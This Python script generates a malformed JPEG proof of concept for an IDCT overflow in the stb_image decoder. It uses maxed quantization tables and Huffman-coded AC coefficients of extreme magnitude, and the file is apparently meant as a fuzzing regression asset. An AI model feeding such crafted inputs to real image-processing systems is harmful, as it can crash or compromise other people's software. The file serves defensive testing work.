#!/usr/bin/env python3
"""Generate a local JPEG PoC for the stb_image IDCT overflow path.

This generator builds a tiny baseline JPEG from first principles:
- one 8x8 grayscale MCU,
- quantization table entries set to 255,
- custom Huffman tables that decode AC coefficients with size=15.

The output is intended for local regression assets where we need provenance
without importing third-party corpus files.
"""

from __future__ import annotations

import argparse
from pathlib import Path


def build_jpeg_idct_overflow_poc() -> bytes:
    payload = bytearray()

    # SOI
    payload += b"\xff\xd8"

    # DQT (8-bit precision, table id 0): all 255 to maximize dequant values.
    quant_table = bytes([255] * 64)
    payload += b"\xff\xdb" + (67).to_bytes(2, "big") + b"\x00" + quant_table

    # SOF0: baseline DCT, 8x8 image, one component using QT0.
    payload += b"\xff\xc0"
    payload += (11).to_bytes(2, "big")
    payload += bytes([8])
    payload += (8).to_bytes(2, "big")
    payload += (8).to_bytes(2, "big")
    payload += bytes([1, 1, 0x11, 0])

    # DHT DC table (class 0 id 0): one symbol (category 0) with code length 1.
    dc_bits = bytes([1] + [0] * 15)
    dc_vals = bytes([0x00])
    payload += b"\xff\xc4" + (2 + 1 + 16 + len(dc_vals)).to_bytes(2, "big")
    payload += bytes([0x00]) + dc_bits + dc_vals

    # DHT AC table (class 1 id 0):
    # - symbol 0x0f (run=0,size=15) at code length 1
    # - symbol 0x00 (EOB) at code length 2
    ac_bits = bytes([1, 1] + [0] * 14)
    ac_vals = bytes([0x0F, 0x00])
    payload += b"\xff\xc4" + (2 + 1 + 16 + len(ac_vals)).to_bytes(2, "big")
    payload += bytes([0x10]) + ac_bits + ac_vals

    # SOS: one component using DC0/AC0.
    payload += b"\xff\xda"
    payload += (8).to_bytes(2, "big")
    payload += bytes([1, 1, 0x00, 0, 63, 0])

    # Entropy stream for one MCU block:
    # - DC uses category 0 symbol
    # - 63 AC coefficients use symbol 0x0f and magnitude bits all ones (+32767)
    bits = [0]
    for _ in range(63):
        bits.append(0)
        bits.extend([1] * 15)

    # JPEG entropy coding pads with ones at byte boundary.
    while len(bits) % 8 != 0:
        bits.append(1)

    entropy = bytearray()
    for idx in range(0, len(bits), 8):
        byte = 0
        for bit in bits[idx : idx + 8]:
            byte = (byte << 1) | bit
        entropy.append(byte)
        # Byte stuffing in entropy-coded segment.
        if byte == 0xFF:
            entropy.append(0x00)

    payload += entropy

    # EOI
    payload += b"\xff\xd9"
    return bytes(payload)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Generate fuzz0006 JPEG IDCT overflow PoC"
    )
    parser.add_argument(
        "--output",
        default="tests/data/security/fuzzing/data/fuzz0006/jpeg_idct_overflow_regenerated.jpg",
        help="Output file path",
    )
    args = parser.parse_args()

    out_path = Path(args.output)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(build_jpeg_idct_overflow_poc())
    print(f"wrote {out_path} ({out_path.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
